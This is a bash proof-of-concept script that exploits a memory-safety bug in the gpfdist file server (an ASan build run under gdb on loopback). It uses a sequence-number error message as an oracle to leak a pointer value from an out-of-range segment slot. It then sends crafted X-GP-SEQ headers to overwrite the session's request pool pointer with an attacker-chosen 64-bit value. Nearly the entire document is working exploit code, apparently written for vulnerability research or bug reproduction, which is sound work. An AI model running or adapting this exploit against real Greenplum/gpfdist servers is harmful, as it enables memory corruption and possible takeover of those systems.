#!/usr/bin/env bash
# Loopback-only: create a session in-bounds (id=0), use the :3517 sequence
# oracle to learn the value in the pointer-valued seq_segs[28] slot, then
# send that value as X-GP-SEQ so :3677 writes an attacker-supplied 64-bit
# value into the session->requests hash pool pointer.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
PORT=18124
OUT="$HERE/out_pointer_$PORT"; rm -rf "$OUT"; mkdir -p "$OUT/data"
printf 'row1\n' > "$OUT/data/out.txt"
: > "$OUT/server.log"
export ASAN_OPTIONS='detect_leaks=0:abort_on_error=0'
cd "$HERE"
gdb -q -batch -x gdb_pointer_chosen.gdb ./gpfdist_v761_asan >"$OUT/gdb.log" 2>&1 &
GPID=$!
for i in $(seq 1 80); do (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break; sleep 0.1; done
S="http://127.0.0.1:$PORT/out.txt"
req() { curl -sS -m 5 -o "$OUT/body_$1" -w '%{http_code}' -X POST "$S" \
  -H 'X-GP-PROTO:1' -H 'X-GP-XID:99' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
  -H 'X-GP-SEGMENT-COUNT:1' -H "X-GP-SEGMENT-ID:$2" -H "X-GP-SEQ:$3" \
  2>"$OUT/err_$1"; }
expected() { grep 'expected sequence number' "$OUT/server.log" | tail -1 | grep -oE 'expected sequence number is [0-9]+' | awk '{print $NF}'; }
echo "setup http=$(req setup 0 1)"
echo "probe1 http=$(req probe1 28 2) slot_plus_1=$(expected)"
VAL=$(expected)
if [ -n "$VAL" ]; then
  echo "chosen_write http=$(req chosen 28 "$VAL") seq=$VAL"
  sleep 1
  echo "verify http=$(req verify 28 2) slot_plus_1_now=$(expected)"
fi
kill "$GPID" 2>/dev/null; wait "$GPID" 2>/dev/null
echo '--- gdb log ---'; cat "$OUT/gdb.log"
echo '--- server log (key lines) ---'
grep -E 'new session|joined session|free session|out of order|HTTP ERROR|Segmentation' "$OUT/server.log" | tail -20
printf '\n--- asan files ---\n'; ls "$OUT"/asan* 2>/dev/null | head -5
